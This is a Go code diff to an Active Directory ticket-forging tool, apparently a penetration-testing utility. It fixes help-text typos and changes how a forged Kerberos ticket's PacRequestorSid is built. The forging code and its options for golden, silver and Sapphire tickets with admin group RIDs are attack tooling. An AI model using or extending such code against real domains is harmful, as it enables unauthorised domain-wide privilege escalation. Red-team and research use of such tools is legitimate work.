@@ -48,11 +48,11 @@ var helpForgeOptions = `
           --user-rid <RID>        Relative id of --target user
           --domain-sid <SID>      SID of domain to use in forged ticket
           --extra-sids <SID>,..	  List of Sids to put in extra sids field of forged ticket
-          --groups  <RID>,..      List of group relative ids to but in forged ticket (default 513,512,520,518,519)
+          --groups  <RID>,..      List of group relative ids to put in forged ticket (default 513,512,520,518,519)
           --spn	<SPN>             SPN used to forge a service ticket of format "service/FQDN"
           --duration <duration>   Ticket validity duration for crafted tickets. Format 8h, 30m. (default 10h)
           --logon-server <name>   Logon server to populate forged ticket with
-          --impersonate <user>    Create a Saphire ticket, impersonating the specified user through Kerberos U2U
+          --impersonate <user>    Create a Sapphire ticket, impersonating the specified user through Kerberos U2U
           --sign-nt <NT Hash>     Hex encoded NT Hash of key to sign or decrypt ticket with
           --sign-aes <AES key>    Hex encoded AES128/256 key to sign or decrypt ticket with
           --out-file <path>       Filename to write requested/forged ticket to (default creds.ccache)
@@ -255,12 +255,22 @@ func forgeTicket(args *userArgs) (ticket messages.Ticket, decryptedEncPart messa
 			}
 			if ourPac.PacRequestorSid == nil {
 				// Should be present so we create it
-				if !isFlagSet("user-rid") {
-					log.Warningf("The retrieved PAC did not contain the PacRequestorInfo SID so we have to create it. Since a --user-rid is NOT specified we will fallback on the default value of: %d. If you get an error KDC_ERR_TGT_REVOKED you should specify the correct --user-rid\n", args.userRid)
+				log.Infoln("PacRequestorSid missing so adding it to PAC")
+				if args.domainSid.v != nil {
+					if !isFlagSet("user-rid") {
+						log.Warningf("The retrieved PAC did not contain the PacRequestorInfo SID so we have to create it. Since a --user-rid is NOT specified we will fallback on the default value of: %d. If you get an error KDC_ERR_TGT_REVOKED you should specify the correct --user-rid\n", args.userRid)
+					}
+					ourPac.PacRequestorSid = &pac.PacRequestorSid{Sid: args.domainSid.GetRPCSID()}
+					ourPac.PacRequestorSid.Sid.SubAuthority = append(ourPac.PacRequestorSid.Sid.SubAuthority, uint32(args.userRid))
+					ourPac.PacRequestorSid.Sid.SubAuthorityCount++
+				} else {
+					// Derive from the PAC's KerbValidationInfo (domain SID + UserID)
+					domainSid := ourPac.KerbValidationInfo.LogonDomainID
+					userRid := ourPac.KerbValidationInfo.UserID
+					domainSid.SubAuthority = append(domainSid.SubAuthority, userRid)
+					domainSid.SubAuthorityCount++
+					ourPac.PacRequestorSid = &pac.PacRequestorSid{Sid: domainSid}
 				}
-				ourPac.PacRequestorSid = &pac.PacRequestorSid{Sid: args.domainSid.GetRPCSID()}
-				ourPac.PacRequestorSid.Sid.SubAuthority = append(ourPac.PacRequestorSid.Sid.SubAuthority, uint32(args.userRid))
-				ourPac.PacRequestorSid.Sid.SubAuthorityCount++
 			}
 			// Fix flags to match that of a TGT rather than ST
 			types.SetFlags(&st.DecryptedEncPart.Flags, []int{flags.Forwardable, flags.Proxiable, flags.Renewable, flags.PreAuthent})
